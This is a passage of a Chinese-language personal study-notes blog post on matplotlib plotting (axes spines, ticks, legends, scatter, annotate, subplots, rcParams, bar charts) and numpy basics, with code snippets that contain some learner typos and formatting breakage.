class="line-numbers-rows"><span></span></span></code></pre><h2 id="设置图片边界"><a href="#设置图片边界" class="headerlink" title="设置图片边界"></a>设置图片边界</h2><h2 id="设置记号"><a href="#设置记号" class="headerlink" title="设置记号"></a>设置记号</h2><ol><li>r表示不需要转义,raw(生的)，LATEX用法，python中使用latex,需要在文本的后面加上$,\pi会转义为pi<pre class="line-numbers language-none"><code class="language-none">xticks(lis,[r&#39;$-\pi$&#39;,r&#39;$-\pi&#x2F;2$&#39;,r&#39;$0$&#39;,r&#39;$-\pi$&#39;,r&#39;$-\pi$&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>后面数组中的每一个元素都与前面元素一一对应</li></ol><h2 id="设置轴："><a href="#设置轴：" class="headerlink" title="设置轴："></a>设置轴：</h2><ol><li>matplotlib的图中，默认有四个轴，两个横轴和两个竖轴，通过ax.plt.gca()方法获取，gca是get current axes的缩写（axes是轴的意思）</li><li>总共有四个轴：top,bottom,left,right<h3 id="由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示"><a href="#由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示" class="headerlink" title="由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示"></a>由于axes会获取到四个轴，而我们只需要两个轴，所以我们需要把另外两个轴隐藏，把顶部和右边轴的颜色设置为none，将不会显示</h3><pre class="line-numbers language-none"><code class="language-none">ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>将会看见top和right边被隐藏<h3 id="移动下面和左边的轴到指定的位置"><a href="#移动下面和左边的轴到指定的位置" class="headerlink" title="移动下面和左边的轴到指定的位置"></a>移动下面和左边的轴到指定的位置</h3><h4 id="具体函数-ax-spines-‘四个轴的位置’-set-position-‘值的类型’，具体值"><a href="#具体函数-ax-spines-‘四个轴的位置’-set-position-‘值的类型’，具体值" class="headerlink" title="具体函数:ax.spines[‘四个轴的位置’].set_position(‘值的类型’，具体值)"></a>具体函数:ax.spines[‘四个轴的位置’].set_position(‘值的类型’，具体值)</h4><pre class="line-numbers language-none"><code class="language-none">一定一定要注意，spines后面是[]而非(),set_position後面是()我對此的理解為：[]表示选择，ax在gca()时已经初始化了，[]是在top,bottom,left和right中的选择；()表示需补充参数，参数未经过初始化区分选择和补充的含义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="以下是set-position中各种值的类型"><a href="#以下是set-position中各种值的类型" class="headerlink" title="以下是set_position中各种值的类型"></a>以下是set_position中各种值的类型</h4></li><li>data:移动轴的位置到交叉轴的指定坐标</li><li>outward:不太懂</li><li>axes:0.0~1.0之间的值，整个轴上的比例</li><li>center:(‘axes’,0.5)</li><li>zero:(‘data’,0.0)<pre class="line-numbers language-none"><code class="language-none">ax.spines[&#39;bottom&#39;].set_position((&#39;data&#39;,0))ax.spines[&#39;left&#39;].set_position((&#39;data&#39;,0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><a href="https://imgtu.com/i/LrlVm9"><img src="https://s1.ax1x.com/2022/04/20/LrlVm9.png" alt="LrlVm9.png"></a><br><a href="https://imgtu.com/i/LrlZwR"><img src="https://s1.ax1x.com/2022/04/20/LrlZwR.png" alt="LrlZwR.png"></a></li><li>由上图可看出，这个轴其实不是坐标轴，而是图形的边界</li><li>我认为：top和right的轴是图形的边界，不能够改变坐标轴</li><li>而left和bottom可以改变坐标轴的位置，参数如上图所示</li></ol><h2 id="添加图例："><a href="#添加图例：" class="headerlink" title="添加图例："></a>添加图例：</h2><ol><li>在plot函数中以[键-值] 的形式增加一个参数<pre class="line-numbers language-none"><code class="language-none">plot(X,S,color&#x3D;&quot;blue&quot;,linewidth&#x3D;2.5,linestyle&#x3D;&quot;-&quot;,lable&#x3D;&quot;图例名称&quot;)legend(loc&#x3D;&quot;位置&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>legend位置参数：upper,bottom,left,right<h3 id="常用legend函数参数："><a href="#常用legend函数参数：" class="headerlink" title="常用legend函数参数："></a>常用legend函数参数：</h3></li><li>loc:图例位置</li><li>fontsize:字体大小</li><li>edgecolor: frame edgecolor</li><li>facecolor: frame facecolor</li></ol><h2 id="特殊点添加注释：函数scatter-意为分散的点"><a href="#特殊点添加注释：函数scatter-意为分散的点" class="headerlink" title="特殊点添加注释：函数scatter(意为分散的点)"></a>特殊点添加注释：函数scatter(意为分散的点)</h2><ol><li>前提：x，y轴包括数值以及大小和颜色</li><li><a href="https://www.jb51.net/article/127806.htm">https://www.jb51.net/article/127806.htm</a><pre class="line-numbers language-none"><code class="language-none">scatter([t,],[np.cos(t),],50,color&#x3D;&#39;blue&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>scatter(x,y,[size],[color],[marker])<h3 id="scatter参数详解："><a href="#scatter参数详解：" class="headerlink" title="scatter参数详解："></a>scatter参数详解：</h3></li><li>x,y:形如shape[n,]不全的数组，即添加注释点的位置</li><li>size:直接给出点的大小，标量或者形如shape[n,]的数组</li><li>color:色彩或颜色序列</li><li>marker:markstyle,可选，默认’o’<br><img src="https://img.jbzj.com/file_images/article/201711/201711081604306.jpg" alt="marker"></li></ol><h3 id="annotate参数详解"><a href="#annotate参数详解" class="headerlink" title="annotate参数详解"></a>annotate参数详解</h3><pre class="line-numbers language-none"><code class="language-none">annotate(s,xy,xytext&#x3D;None,xycoords&#x3D;&#39;data&#39;,textcoords&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>s:被注释内容</li><li>xy:被注释的坐标点，二维元组形如[x,y]</li><li>xytext:注释文本的坐标点，也是二维元组，默认与xy相同</li><li>xycoords:被注释点的坐标系属性</li><li>textcoords设置注释文本的坐标系属性<pre class="line-numbers language-none"><code class="language-none">annotate(r&#39;$sin(\frac&#123;2\pi&#125;&#123;3&#125;)&#39;&#x3D;\frac&#123;\sqrt&#123;3&#125;&#125;&#123;2&#125;$&#39;,xy&#x3D;(t,np.sin(t)),xycoords&#x3D;&#39;data&#39;,xytext&#x3D;(+10,+30),textcoords&#x3D;&#39;offset points&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="看过李师哥的备课后的补充"><a href="#看过李师哥的备课后的补充" class="headerlink" title="看过李师哥的备课后的补充"></a>看过李师哥的备课后的补充</h1><h2 id="构建画框的骨架的两种方法："><a href="#构建画框的骨架的两种方法：" class="headerlink" title="构建画框的骨架的两种方法："></a>构建画框的骨架的两种方法：</h2><pre class="line-numbers language-none"><code class="language-none">fig &#x3D; plt.figure()ax &#x3D; fig.add_axes([0.1,0.1,0.8,0.8])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>和<pre class="line-numbers language-none"><code class="language-none">fig &#x3D; plt.figure()ax &#x3D; gca()&#x2F;&#x2F;初始化四个轴left &#x3D; bottom &#x3D; 0.1right &#x3D; top &#x3D; 0.8ls &#x3D; [left,bottom,right,top]for i in ls:ax.spines[top].set_position(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="子图的划分"><a href="#子图的划分" class="headerlink" title="子图的划分"></a>子图的划分</h2><ol><li>如果两个图片的x轴的范围不同的情况下，放在同一张画布下是不易显示的<h3 id="格式一"><a href="#格式一" class="headerlink" title="格式一"></a>格式一</h3><pre class="line-numbers language-none"><code class="language-none">figure &#x3D; plt.figure()plt.subplot(nrows,ncols,plot_number)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>其中nrows表示要划分的行数</li><li>ncols表示要划分的列数</li><li>plot_number表示当前的子图区<pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; []y &#x3D; []figure &#x3D; figure((m，n)，dpi)&#x2F;&#x2F;创建一个m*n点的图像axes1 &#x3D; figure.add_subplot(2,1,1)&#x2F;&#x2F;划分为两行，将第一行作为当前需要描绘的子图区plot(x,y)x &#x3D; []y &#x3D; []axes2 &#x3D; figure.add_subplot(2,1,2)&#x2F;&#x2F;选取第二块子图区plot(x,y)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="plt-rcParams属性总结"><a href="#plt-rcParams属性总结" class="headerlink" title="plt.rcParams属性总结"></a>plt.rcParams属性总结</h2><ol><li>plt使用rc配置文件；来自定义图形的各种观点默认属性，称之为rc配置或rc参数，通过rc参数可以修改默认的属性，包括窗体大小，每英寸的点数，线条宽度，颜色，样式，坐标轴坐标，网络属性，文本，字体</li><li>plt.rcParams[‘font.sans-serif’] = ‘SimHei’设置字体</li><li>plt.rcParams[‘axes.unicode_minus’] = False字符显示：减号使用unicode编码而不是连字符号</li></ol><h3 id="设置中文字体："><a href="#设置中文字体：" class="headerlink" title="设置中文字体："></a>设置中文字体：</h3><ol><li>plt.rcParams[‘font.san-serif’]=[‘SimHei’]：SimHei是设置字体为黑体</li><li>plt.rcParams[‘axes.unicode_minus’] = False设置字符显示</li><li>这个地方的unicode_minus我的理解为减去unicode即为不使用Unicode编码</li><li>如果设置为false，则负负得正，使用Unicode编码<h3 id="获取用户配置路径"><a href="#获取用户配置路径" class="headerlink" title="获取用户配置路径"></a>获取用户配置路径</h3><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.get_gonfigdir()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="获取用户当前使用配置文件的路径"><a href="#获取用户当前使用配置文件的路径" class="headerlink" title="获取用户当前使用配置文件的路径"></a>获取用户当前使用配置文件的路径</h3><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.matplotlib_fname()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="查看rc参数的方法与rc参数的使用"><a href="#查看rc参数的方法与rc参数的使用" class="headerlink" title="查看rc参数的方法与rc参数的使用"></a>查看rc参数的方法与rc参数的使用</h3><ol><li><p>查看：</p><pre class="line-numbers language-none"><code class="language-none">import matplotlib as mplprint(mpl.rcParams)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>修改：(用中括号去取下标)</p><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.rcParams[&#39;具体参数名称&#39;] &#x3D; xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>通过matplotlib.rc一次设置多个参数</p><pre class="line-numbers language-none"><code class="language-none">import matplotlibmatplotlib.rc(&#39;lines&#39;,linewidth&#x3D;2,color&#x3D;&#39;red&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>rc参数说明：</p><pre class="line-numbers language-none"><code class="language-none">lines.linewidth:线宽lines.linestyle:线的风格lines.color:线的颜色lines.marker:None 默认标记lines.markersize:标记大小lines.antialiased:True 使用抗锯齿渲染：没有缺口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="rc参数字体属性："><a href="#rc参数字体属性：" class="headerlink" title="rc参数字体属性："></a>rc参数字体属性：</h4></li><li><p>font.family</p></li><li><p>font.style:normal(roman),italic,oblique</p></li><li><p>font.variant:normal,small-caps</p></li><li><p>font.weight:normal,bold,bolder,lighter,100,200,300…900</p></li><li><p>font.stretch</p></li><li><p>font.size:默认字体大小，以磅为单位</p></li><li><p>网格：</p><pre class="line-numbers language-none"><code class="language-none">grid.color:网格颜色grid.linestyle:点grid.linewidth:pt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="具体参数详见博客地址"><a href="#具体参数详见博客地址" class="headerlink" title="具体参数详见博客地址"></a>具体参数详见博客地址</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;shuaishuaidefeizhu&#x2F;p&#x2F;14035247.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>引入matpoltlib库</li><li>创建一个图作为背景figure</li><li>x轴坐标，y轴坐标</li><li>plot绘制曲线</li><li>设置横轴上下限xlim</li><li>设置横轴记号和纵轴记号</li><li>保存图片savefig</li><li>在屏幕上显示show</li></ol><h1 id="正弦函数图像"><a href="#正弦函数图像" class="headerlink" title="正弦函数图像"></a>正弦函数图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *figure(figsize&#x3D;(8,6),dpi&#x3D;80)x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint&#x3D;True)y &#x3D; np.sin(x)plot(x,y,color&#x3D;&#39;blue&#39;,linewidth&#x3D;&#39;10&#39;,linestyle&#x3D;&#39;-&#39;)xlim(-4.0,4.0)ylim(-1.0,1.0)xticks(np.linspace(-4,4,9,endpoint&#x3D;True))yticks(np.linspace(-1.0,1.0,3,endpoint&#x3D;True))ax &#x3D; gca()ax.spines[&#39;right&#39;].set_color(&#39;None&#39;)ax.spines[&#39;top&#39;].set_color(&#39;None&#39;)ax.spines[&#39;bottom&#39;].set_position((&#39;axes&#39;,0.5))ax.spines[&#39;left&#39;].set_position((&#39;axes&#39;,0.5))show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二次曲线图像"><a href="#二次曲线图像" class="headerlink" title="二次曲线图像"></a>二次曲线图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *from numpy import *x &#x3D; np.linspace(-1,1,66,endpoint&#x3D;True)y &#x3D; x**2plot(x,y,linestyle&#x3D;&#39;-&#39;,lw&#x3D;&#39;10&#39;,color&#x3D;&#39;blue&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="正余弦函数图像"><a href="#正余弦函数图像" class="headerlink" title="正余弦函数图像"></a>正余弦函数图像</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *fig &#x3D; figure(figsize&#x3D;(8,6),dpi&#x3D;80)#dpi参数是分辨率fig.add_axes([0.1,0.1,0.8,0.8])subplot(1,1,1)#创建一个1*1子图，接下来图样的绘制在第一块x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint&#x3D;True)c,s &#x3D; np.cos(x),np.sin(x)plot(x,c,color&#x3D;&quot;blue&quot;,linewidth&#x3D;1.0,linestyle&#x3D;&quot;solid&quot;,label&#x3D;&quot;cosine&quot;)plot(x,s,color&#x3D;&quot;green&quot;,linewidth&#x3D;1.0,linestyle&#x3D;&quot;dotted&quot;,label&#x3D;&quot;sine&quot;)legend(loc&#x3D;&#39;upper left&#39;,fontsize&#x3D;&quot;18&quot;)xlim(-4.0,4.0)lis &#x3D; ([-np.pi,-np.pi&#x2F;2.0,0,np.pi&#x2F;2.0,np.pi])#xticks(np.linspace(-4,4,9,endpoint&#x3D;True))ylim(-1.0,1.0)#yticks(np.linspace(-4,4,9,endpoint&#x3D;True))#xticks(lis)xticks(lis,[r&#39;$-\pi$&#39;,r&#39;$-\pi&#x2F;2$&#39;,r&#39;$0$&#39;,r&#39;$-\pi$&#39;,r&#39;$-\pi$&#39;])#r表示不需要转义,raw(生的)，LATEX用法，python中使用latex,需要在文本的后面加上$,\pi会转义为piyticks(lis)ax &#x3D; gca()ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)ax.spines[&#39;bottom&#39;].set_position((&#39;axes&#39;,0.5))ax.spines[&#39;left&#39;].set_position((&#39;axes&#39;,0.5))t &#x3D; 2*np.pi&#x2F;3plot([t,t],[0,np.cos(t)],color&#x3D;&#39;blue&#39;,linewidth&#x3D;2.5,linestyle&#x3D;&#39;--&#39;)scatter([t,],[np.cos(t),],50,color&#x3D;&#39;blue&#39;)t &#x3D; 2*np.pi&#x2F;3plot([t,t],[0,np.cos(t)], color &#x3D;&#39;blue&#39;, linewidth&#x3D;2.5, linestyle&#x3D;&quot;--&quot;)scatter([t,],[np.cos(t),], 50, color &#x3D;&#39;blue&#39;)annotate(r&#39;$\sin(\frac&#123;2\pi&#125;&#123;3&#125;)&#x3D;\frac&#123;\sqrt&#123;3&#125;&#125;&#123;2&#125;$&#39;,         xy&#x3D;(t, np.sin(t)), xycoords&#x3D;&#39;data&#39;,         xytext&#x3D;(+10, +30), textcoords&#x3D;&#39;offset points&#39;, fontsize&#x3D;16,         arrowprops&#x3D;dict(arrowstyle&#x3D;&quot;-&gt;&quot;, connectionstyle&#x3D;&quot;arc3,rad&#x3D;.2&quot;))plot([t,t],[0,np.sin(t)], color &#x3D;&#39;red&#39;, linewidth&#x3D;2.5, linestyle&#x3D;&quot;--&quot;)scatter([t,],[np.sin(t),], 50, color &#x3D;&#39;red&#39;)annotate(r&#39;$\cos(\frac&#123;2\pi&#125;&#123;3&#125;)&#x3D;-\frac&#123;1&#125;&#123;2&#125;$&#39;,         xy&#x3D;(t, np.cos(t)), xycoords&#x3D;&#39;data&#39;,         xytext&#x3D;(-90, -50), textcoords&#x3D;&#39;offset points&#39;, fontsize&#x3D;16,         arrowprops&#x3D;dict(arrowstyle&#x3D;&quot;-&gt;&quot;, connectionstyle&#x3D;&quot;arc3,rad&#x3D;.2&quot;))show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条"><a href="#将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条" class="headerlink" title="将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条"></a>将一个figure对象划分为6个子图，分别绘制不同的曲线，不同的颜色和标记的线条</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [3,5,7,1,9,12]figure &#x3D; figure(figsize&#x3D;(8,6),dpi &#x3D; 80)axes1 &#x3D; figure.add_subplot(2,3,1)axes2 &#x3D; figure.add_subplot(2,3,2)axes3 &#x3D; figure.add_subplot(2,3,3)axes4 &#x3D; figure.add_subplot(2,3,4)axes5 &#x3D; figure.add_subplot(2,3,5)axes6 &#x3D; figure.add_subplot(2,3,6)axes1.plot(x,y,&#39;ro&#39;)axes2.plot(x,y,&#39;r-*&#39;)axes3.plot(x,y,&#39;bs&#39;)axes4.plot(x,y,&#39;^g-.&#39;)axes5.plot(x,y,&#39;m8&#39;)axes6.plot(x,y,&#39;yd:&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>plot中的线条的线性，标记的符号和线条的颜色参数的前后位置没有要求</li></ol><h1 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h1><h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><ol><li>在条形图中可以非常直观地通过位置比较比较数值大小，因为在条形图中条的高度就是数值，所以一眼就可以看出数值的高度</li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre class="line-numbers language-none"><code class="language-none">bar(x,height,width,bottom)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><ol><li><p>(x,height)定义在什么位置上，多高的bar（这个地方的高度其实是条形图的宽度，因为是躺着的，所以叫高度）</p></li><li><p>width定义bar的宽度（这个地方的宽度是条形图的高度，因为是躺着的，座椅叫做宽度）</p></li><li><p>bottom定义bar的实际高度（我的理解是bar的实际底在哪里）</p><h4 id="默认参数："><a href="#默认参数：" class="headerlink" title="默认参数："></a>默认参数：</h4></li><li><p>height：柱子的高度，y轴上的坐标</p></li><li><p>width：柱子的宽度，默认值是0.8</p></li><li><p>bottom：柱子的基准高度，浮点数或者类数组结构，默认值为0</p></li><li><p>bar orientation:给定的是一个向量，该向量指定单元局部坐标系的纵轴方向</p><h3 id="条形图实例"><a href="#条形图实例" class="headerlink" title="条形图实例"></a>条形图实例</h3><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [2,3,54,6,7,4]figure &#x3D; figure(figsize&#x3D;(8,6),dpi &#x3D; 80)bar(x,y)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="横向条形图实例"><a href="#横向条形图实例" class="headerlink" title="横向条形图实例"></a>横向条形图实例</h3><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; [1,2,3,4,5,6]y &#x3D; [3,5,1,7,9,12]#x指定其实位置从0开始，bottom指定水平条其实位置为左侧，height指定绘图的水平条的宽度，width指定绘制的水平条的长度，orientation指定要绘制的是水平条，color指定颜色bar(x&#x3D;0,bottom&#x3D;y,height&#x3D;0.3,width&#x3D;x,orientation&#x3D;&#39;horizontal&#39;,color&#x3D;&#39;red&#39;)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注意重叠问题："><a href="#注意重叠问题：" class="headerlink" title="注意重叠问题："></a>注意重叠问题：</h3></li><li><p>在绘制多组条形图进行对比时需要注意一点，bar_width的范围是(0,1)没错，但是多组图表需要保证几组图表的范围之和不超过1（范围之和！和！！和！！！）</p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;## 2022&#x2F;11再复习1.   导入包2.   &#96;&#96;&#96;python     import matplotlib.pyplot as plt     import numpy as np<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  划分数据，从哪到哪平均分为几份，使用numpy库中的linespace函数</p></li><li><p>```python<br>  x = np.linespace(-1,1,50)</p>  <pre class="line-numbers language-none"><code class="language-none">5.   新建图表6.   &#96;&#96;&#96;python     plt.figure(num&#x3D;1,figsize&#x3D;(8,5),dpi&#x3D;10)     # figsize用来设置图像大小     # num用来设置图像是第几个，编号为几<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  设置坐标轴的范围,matplotlib库中的xlim和ylim函数，x-limit和y-limit</p></li><li><p>```python<br>  plt.xlim((-1,2))<br>  plt.ylim((-2,3))</p>  <pre class="line-numbers language-none"><code class="language-none">9.   设置坐标轴上单位的小标10.   &#96;&#96;&#96;python    # 设置单位的小标    new_ticks &#x3D; np.linspace(-1,2,5)    plt.xticks(new_ticks)    plt.yticks([-2,-1.8,-1,1.22,3],               [r&#39;$really\ bad$&#39;,r&#39;$bad$&#39;,r&#39;$normal$&#39;,r&#39;$good$&#39;,r&#39;$really\ good$&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  设置x轴和y轴的名字,matplotlib库中的xlabel和ylabel</p></li><li><p>```python<br>  plt.xlabel(‘i am x’)<br>  plt.ylabel(‘i am y’)</p>  <pre class="line-numbers language-none"><code class="language-none">13.   设置单位的小标,使用xticks和yticks来设置横坐标和纵坐标14.   &#96;&#96;&#96;python      new_ticks &#x3D; np.linspace(-1,2,5)      plt.xticks(new_ticks)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  gca = ‘get current axis’</p></li><li><p>```python<br>  ax = plt.gca()</p><h1 id="将右边和上边的坐标轴颜色设置为空，不显示"><a href="#将右边和上边的坐标轴颜色设置为空，不显示" class="headerlink" title="将右边和上边的坐标轴颜色设置为空，不显示"></a>将右边和上边的坐标轴颜色设置为空，不显示</h1><p>  ax.spines[‘right’].set_color(‘none’)<br>  ax.spines[‘top’].set_color(‘none’)</p><h1 id="将x轴设置为底部bottom-将y轴设置为顶部top"><a href="#将x轴设置为底部bottom-将y轴设置为顶部top" class="headerlink" title="将x轴设置为底部bottom,将y轴设置为顶部top"></a>将x轴设置为底部bottom,将y轴设置为顶部top</h1><p>  ax.xaxis.set_ticks_position(‘bottom’)<br>  ax.xaxis.set_ticks_position(‘left’)</p><h1 id="将x轴和y轴-底轴和左轴的位置设置为坐标原点"><a href="#将x轴和y轴-底轴和左轴的位置设置为坐标原点" class="headerlink" title="将x轴和y轴(底轴和左轴的位置设置为坐标原点)"></a>将x轴和y轴(底轴和左轴的位置设置为坐标原点)</h1><p>  ax.spines[‘bottom’].set_position((‘data’,0))<br>  ax.spines[‘left’].set_position((‘data’,0))</p>  <pre class="line-numbers language-none"><code class="language-none">17.   添加legend图例18.   &#96;&#96;&#96;      l1 &#x3D; plt.plot(x,y2,label&#x3D;&#39;注记名称&#39;) # x,y2用来选择某条线      l2 &#x3D; plt.plot(x,y1,label&#x3D;&#39;注记名称&#39;) # 前两个参数可以确定某条线      #legend函数用来画出图例      plt.legend()      # 其中loc&#x3D;&#39;&#39;参数默认是best,会自动选择不会挡住图像的最佳位置      # labels&#x3D;[&#39;1&#39;,&#39;2&#39;] 图像标注会覆盖掉plt.plot函数中的label      # handles&#x3D;[]参数会选择要画的线，其中画的线由plt.plot函数赋值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  添加Annotation标注,特别标注某个点并给出文字</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221112102442.png"></p></li><li><p>```python<br>  x0 = 1<br>  y0 = 2 * x0 + 1<br>  plt.Scatter(x0,y0,s=50,color=’blue’) # Scatter用来画出点,s用来设置Scatter.size,color用来设置颜色<br>  plt.plot([x0,x0],[y0,0],’k–’,lw=2.5) # [从.x,到.x][从.y,到.y]</p>  <pre class="line-numbers language-none"><code class="language-none">22.   &#96;&#96;&#96;python      import matplotlib.pyplot as plt      import numpy as np            x &#x3D; np.linspace(-1,1,50)            y1 &#x3D; 2*x + 1      y2 &#x3D; x**2            plt.figure()      # 设置坐标轴的范围      plt.xlim((-1,2))      plt.ylim((-2,3))            # 设置x轴和y轴的名字      plt.xlabel(&#39;i am x&#39;)      plt.ylabel(&#39;i am y&#39;)            # 设置单位的小标      new_ticks &#x3D; np.linspace(-1,2,5)      plt.xticks(new_ticks)      plt.yticks([-2,-1.8,-1,1.22,3],                 [r&#39;$really\ bad$&#39;,r&#39;$bad$&#39;,r&#39;$normal$&#39;,r&#39;$good$&#39;,r&#39;$really\ good$&#39;])            plt.plot(x,y1)      plt.plot(x,y2)            ax &#x3D; plt.gca()      ax.spines[&#39;right&#39;].set_color(&#39;none&#39;)      ax.spines[&#39;top&#39;].set_color(&#39;none&#39;)            ax.xaxis.set_ticks_position(&#39;bottom&#39;)      ax.yaxis.set_ticks_position(&#39;left&#39;)            ax.spines[&#39;bottom&#39;].set_position((&#39;data&#39;,0))      ax.spines[&#39;top&#39;].set_position((&#39;data&#39;,0))            # 添加legend图例      plt.plot(x,y1,label&#x3D;&#39;2*x+1&#39;)      plt.plot(x,y2,label&#x3D;&#39;x**2&#39;)      plt.legend()            plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="numpy数组"><a href="#numpy数组" class="headerlink" title="numpy数组"></a>numpy数组</h1><ol><li>numpy用于处理数组，对象称为ndarray</li><li>可以用array()函数创建一个numpy ndarray对象</li></ol><pre class="line-numbers language-none"><code class="language-none">arr &#x3D; np array([1,2,3,4,5])print(arr)print(type(arr))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="numpy和list的区别："><a href="#numpy和list的区别：" class="headerlink" title="numpy和list的区别："></a>numpy和list的区别：</h1><ol><li>内存大小–numpy数据结构占用的内存空间更小</li><li>性能–numpy底层是用c写的，比列表更快</li><li>运算方法–内置优化了代数运算等方法</li></ol><h1 id="np-linspace函数"><a href="#np-linspace函数" class="headerlink" title="np.linspace函数"></a>np.linspace函数</h1><pre class="line-numbers language-none"><code class="language-none">from pylab import *x &#x3D; np.linspace(-np.pi,np.pi,256,endpoint &#x3D; True)c,s &#x3D; np.cos(x),np.sin(x)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>linspace函数：指定的间隔内返回均匀间隔的数字</li><li>endpoint：bool类型，如果为true则包含stop,否则不包含stop(结尾点)</li></ol><h2 